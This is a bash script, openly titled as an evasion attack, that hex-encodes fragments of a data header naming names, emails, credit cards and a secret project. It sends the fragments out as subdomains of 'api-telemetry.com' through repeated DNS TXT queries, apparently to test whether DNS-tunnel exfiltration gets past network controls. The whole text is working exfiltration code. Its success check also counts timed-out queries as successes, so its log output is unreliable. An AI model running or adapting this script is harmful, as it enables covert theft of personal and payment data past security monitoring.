#!/bin/bash

# --- MICRO-SLICING EVASION ATTACK ---

GATEWAY_IP="192.168.50.1"
MALWARE_ROOT="api-telemetry.com"

echo "[*] Starting Micro-Slicing Attack..."

HEX_CHUNKS=(
"49442c4e61"
"6d652c456d"
"61696c2c43"
"7265646974"
"5f43617264"
"2c53656372"
"65745f435f"
"50524f4a45"
"43545f585f"
"323032365f"
)

for i in {1..100}
do
    CHUNK1=${HEX_CHUNKS[$RANDOM % ${#HEX_CHUNKS[@]}]}
    CHUNK2=${HEX_CHUNKS[$RANDOM % ${#HEX_CHUNKS[@]}]}
    CHUNK3=${HEX_CHUNKS[$RANDOM % ${#HEX_CHUNKS[@]}]}

    DOMAIN="${CHUNK1}.${CHUNK2}.${CHUNK3}.${MALWARE_ROOT}"

    dig +short +time=1 +tries=1 TXT "$DOMAIN" @"$GATEWAY_IP" > /dev/null 2>&1

    STATUS=$?

 
    if [ $STATUS -eq 0 ]; then
        echo "[SUCCESS] Packet $i -> $DOMAIN"
        
    elif [ $STATUS -eq 9 ]; then
        if ping -c 1 -W 1 "$GATEWAY_IP" > /dev/null 2>&1; then
            echo "[SUCCESS] Packet $i -> $DOMAIN"
        else
            echo "[FAILED ] Packet $i -> $DOMAIN (Blocked)"
        fi
    else
        echo "[FAILED ] Packet $i -> $DOMAIN"
    fi

    sleep 0.2
done

echo "[+] Micro-Slicing Attack Completed"
